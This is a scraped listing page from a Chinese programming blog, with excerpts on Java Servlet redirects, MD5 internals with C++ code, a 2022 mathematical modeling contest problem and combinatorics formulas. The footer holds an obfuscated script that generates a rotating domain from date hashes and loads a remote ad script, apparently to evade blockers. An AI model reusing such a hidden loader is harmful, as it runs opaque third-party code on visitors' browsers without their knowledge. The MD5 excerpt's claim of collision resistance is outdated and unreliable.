		## Response对象 * 功能：设置响应消息 1. 设置响应行 1. 格式：HTTP/1.1 200 ok 2. 设置状态码：setStatus(int sc) 2. 设置响应头：setHeader(String name, String value) 3. 设置响应体： * 使用步骤： 1. 获取输出流 * 字符输出流：PrintWriter getWriter() * 字节输出流：ServletOutputStream getOutputStream() 2. 使用输出流，将数据输出到客户端浏览器 * 案例： 1. 完成重定向 * 重定向：资源跳转的方式 * 代码实现： //1. 设置状态码为302 response.setStatus(302); //2.设置响应头location response.setHeader("location","/day15/responseDemo2"); //简单的重定向方法 response.sendRedirect("/day15/responseDemo2"); * 重定向的特点:redirect 1. 地址栏发生变化 2. 重定向可以访问其他站点(服务器)的资源 3. 重定向是两次请求。不能使用request对象来共享数据 * 转发的特点：forward 1. 转发地址栏路径不变 2. 转发只能访问当前服务器下的资源 3. 转发是一次请求，可以使用request对象来共享数据 * forward 和 redirect 区别 * 路径写法： 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91fb8beead1f1de8f15015f4dbbb1597/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f88c36c65bdea90e86c146012a3734d/" rel="bookmark">
			MD5算法原理及实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MD5的概述 MD5由美国密码学家罗纳德·李维斯特（Ronald Linn Rivest）设计，于1992年公开，是一个典型的密码散列函数，MD5方法将所有的文件看作为一个个的文本文件，通过不可逆 的字符串变化算法可以将输入的报文信息转化生成一个128位的散列值。如果报文的内容发生变化，通过哈希算法得到的散列值也会相应地发生变化。
MD5的特点 a) MD5的过程是不可逆的
b)MD5具有高度的离散性
c)产生固定长度的输出结果
d)抵制弱碰撞性
MD5的过程 添加填充位 报文的输入长度可以是任意值，首先需要对输入的报文进行填充处理，使得该报文添加填充位之后的报文长度模512余448，若输入的报文已经满足模余的要求，依旧需要进行填充512位。
图1 报文格式的填充 1
填充位最小长度位最小长度为1，最大长度为512。
填充长度项 填充的的最后64位表示了该报文的未补位之前的长度，大于2^64bit的报文，舍弃掉报文的整数部分，保留余数。
填充结束之后，报文的总长度为512的整数倍。
图2 填充长度项 1
初始化 初始化MD5的四个寄存器，每个寄存器都为32位，初始化的内容为： A=67452301
B=EFCDAB89
C=98BADCFE
D=10325476
分块：按照每组512比特将报文进行分组，多轮压缩：依次对于每组的内容进行单向的哈希变换，每次变换之后使寄存器的值发生变化。 图3 总的操作流程 1
第k个数据块的变化如下所示，首先保存第k-1次的ABCD的值，然后输入第k个数据块，对于ABCD的进行变换。
图4 每个分块的操作 1
在过程中用到的Disturb Functions定义如下：
FF(a,b,c,d,Mj,s,ti) a=b+(a+F(b,c,d)+Mj+ti)&lt;&lt;s GG(a,b,c,d,Mj,s,ti) a=b+(a+G(b,c,d)+Mj+ti)&lt;&lt; s HH(a,b,c,d,Mj,s,ti) a=b+(a+H(b,c,d)+Mj+ti)&lt;&lt; s
II(a,b,c,d,Mj,s,ti) a=b+(a+I(b,c,d)+Mj+ti)&lt;&lt; s
上式中：Mj（0&lt;j&lt;=15）为报文的第j个分块。
&lt;&lt;循环左移 S是表示循环左移s个bit，ti=[4294967296]*abs(sin(i))]标识操作的步骤
四个函数的Fx（b,c,d）定义如下：
F(x,y,z)=(x&amp;y)|((~x)&amp;z)
G(x,y,z)=(x&amp;z)|(y&amp;(~z))
H(x,y,z)=x^y^z
I(x,y,z)=y^(x|(~z))
当所有的报文段都处理完毕之后，最后的输出为 ABCD四个寄存器中内容的级联，从A的低字节开始，直到D的高字节。该值即为该报文的报文摘要。
A=A+AA B=B+BB
C=C+CC D=D+DD
代码实现： #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;vector&gt; #include&lt;cstdio&gt; #include&lt;fstream&gt; namespace md5 { //UINT4 defines a four byte word typedef unsigned int UINT4; typedef unsigned char* POINTER; //define four auxiliary functions #define F(x,y,z) (((x)&amp;(y))|((~x)&amp;(z))) #define G(x,y,z) (((x)&amp;(z))|((y)&amp;(~z))) #define H(x,y,z) ((x)^(y)^(z)) #define I(x,y,z) ((y)^((x)|(~z))) #define ROTATE_LEFT(x,n) (((x)&lt;&lt;(n))| ((x)&gt;&gt;(32-(n)))) using std::string; using std::cin; using std::cout; using std::endl; // void FF(UINT4&amp; a, UINT4 b, UINT4 c, UINT4 d, UINT4 m, UINT4 s, UINT4 t) { a = b + ROTATE_LEFT((a + F(b, c, d) + m + t), s); } void GG(UINT4&amp; a, UINT4 b, UINT4 c, UINT4 d, UINT4 m, UINT4 s, UINT4 t) { a = b + ROTATE_LEFT((a + G(b, c, d) + m + t), s); } void HH(UINT4&amp; a, UINT4 b, UINT4 c, UINT4 d, UINT4 m, UINT4 s, UINT4 t) { a = b + ROTATE_LEFT((a + H(b, c, d) + m + t), s); } void II(UINT4&amp; a, UINT4 b, UINT4 c, UINT4 d, UINT4 m, UINT4 s, UINT4 t) { a = b + ROTATE_LEFT((a + I(b, c, d) + m + t), s); } typedef struct { UINT4 state[4]; /* state (ABCD) */ UINT4 count[2]; /* number of bits, modulo 2^64 (lsb first) */ unsigned char buffer[64]; /* input buffer */ } MD5_CTX; //Initialize MD Buffer void MD5Init(MD5_CTX* context) { context-&gt;count[0] = context-&gt;count[1] = 0; /* Load magic initialization constants.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f88c36c65bdea90e86c146012a3734d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b3ce4f5a5969561aa355225654ff47d/" rel="bookmark">
			2022年高教社杯国赛C题思路 : 古代玻璃制品的成分分析与鉴别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 C题：古代玻璃制品的成分分析与鉴别 丝绸之路是古代中西方文化交流的通道，其中玻璃是早期贸易往来的宝贵物证。早期的玻
璃在西亚和埃及地区常被制作成珠形饰品传入我国，我国古代玻璃吸收其技术后在本土就地取
材制作，因此与外来的玻璃制品外观相似，但化学成分却不相同。
玻璃的主要原料是石英砂，主要化学成分是二氧化硅（SiO2）。由于纯石英砂的熔点较高，
为了降低熔化温度，在炼制时需要添加助熔剂。古代常用的助熔剂有草木灰、天然泡碱、硝石
和铅矿石等，并添加石灰石作为稳定剂，石灰石煅烧以后转化为氧化钙（CaO）。添加的助熔
剂不同，其主要化学成分也不同。例如，铅钡玻璃在烧制过程中加入铅矿石作为助熔剂，其氧
化铅（PbO）、氧化钡（BaO）的含量较高，通常被认为是我国自己发明的玻璃品种，楚文化
的玻璃就是以铅钡玻璃为主。钾玻璃是以含钾量高的物质如草木灰作为助熔剂烧制而成的，主
要流行于我国岭南以及东南亚和印度等区域。
古代玻璃极易受埋藏环境的影响而风化。在风化过程中，内部元素与环境元素进行大量交
换，导致其成分比例发生变化，从而影响对其类别的正确判断。如图 1 的文物标记为表面无风
化，表面能明显看出文物的颜色、纹饰，但不排除局部有较浅的风化；图 2 的文物标记为表面
风化，表面大面积灰黄色区域为风化层，是明显风化区域，紫色部分是一般风化表面。在部分
风化的文物中，其表面也有未风化的区域。
现有一批我国古代玻璃制品的相关数据，考古工作者依据这些文物样品的化学成分和其他
检测手段已将其分为高钾玻璃和铅钡玻璃两种类型。附件表单 1 给出了这些文物的分类信息，
附件表单 2 给出了相应的主要成分所占比例（空白处表示未检测到该成分）。这些数据的特点
是成分性，即各成分比例的累加和应为 100%，但因检测手段等原因可能导致其成分比例的累
加和非 100%的情况。本题中将成分比例累加和介于 85%~105%之间的数据视为有效数据。
请你们团队依据附件中的相关数据进行分析建模，解决以下问题：
问题 1 对这些玻璃文物的表面风化与其玻璃类型、纹饰和颜色的关系进行分析；结合玻
璃的类型，分析文物样品表面有无风化化学成分含量的统计规律，并根据风化点检测数据，预
测其风化前的化学成分含量。
问题 2 依据附件数据分析高钾玻璃、铅钡玻璃的分类规律；对于每个类别选择合适的化
学成分对其进行亚类划分，给出具体的划分方法及划分结果，并对分类结果的合理性和敏感性
进行分析。
问题 3 对附件表单 3 中未知类别玻璃文物的化学成分进行分析，鉴别其所属类型，并对
分类结果的敏感性进行分析。
问题 4 针对不同类别的玻璃文物样品，分析其化学成分之间的关联关系，并比较不同类
别之间的化学成分关联关系的差异性。
附件
表单 1 玻璃文物的基本信息
表单 2 已分类玻璃文物的化学成分比例，其中
(1) 文物采样点为该编号文物表面某部位的随机采样，其风化属性与附件表单 1 中相应文
物一致。
(2) 部位 1 和部位 2 是文物造型上不同的两个部位，其成分与含量可能存在差异。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b3ce4f5a5969561aa355225654ff47d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea38bdb27fa5d2390e3381e5f93b544e/" rel="bookmark">
			排列组合C几几怎么算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		排列组合c的公式：C(n,m)=A(n,m)/m!=n!/m!(n-m)!与C(n,m)=C(n,n-m)。(n为下标,m为上标)。例如C(4,2)=4!/(2!*2!)=4*3/(2*1)=6,C(5,2)=C(5,3)。
排列组合c计算方法：C是从几个中选取出来，不排列，只组合。
C(n，m)=n*(n-1)*...*(n-m+1)/m!
例如c53=5*4*3÷(3*2*1)=10，再如C(4,2)=(4x3)/(2x1)=6。
步骤：
1、大写字母C,下标n,上标m。
2、C(n，m)表示从n个元素中取出m 个元素的不同的方法数。如从5个人中选2人去开会,不同的选法有C(5,2)=10种。
3、C(n,m)的计算方法是C(n,m)=n!/[m!(n-m)!]=n*(n-1)*...*(n-m+1)。
扩展资料
排列组合(组合数学中的一种)
排列组合是组合学最基本的概念。所谓排列，就是指从给定个数的元素中取出指定个数的元素进行排序。组合则是指从给定个数的元素中仅仅取出指定个数的元素，不考虑排序。
排列组合的中心问题是研究给定要求的排列和组合可能出现的情况总数。 排列组合与古典概率论关系密切。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/231/">«</a>
	<span class="pagination__item pagination__item--current">232/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/233/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>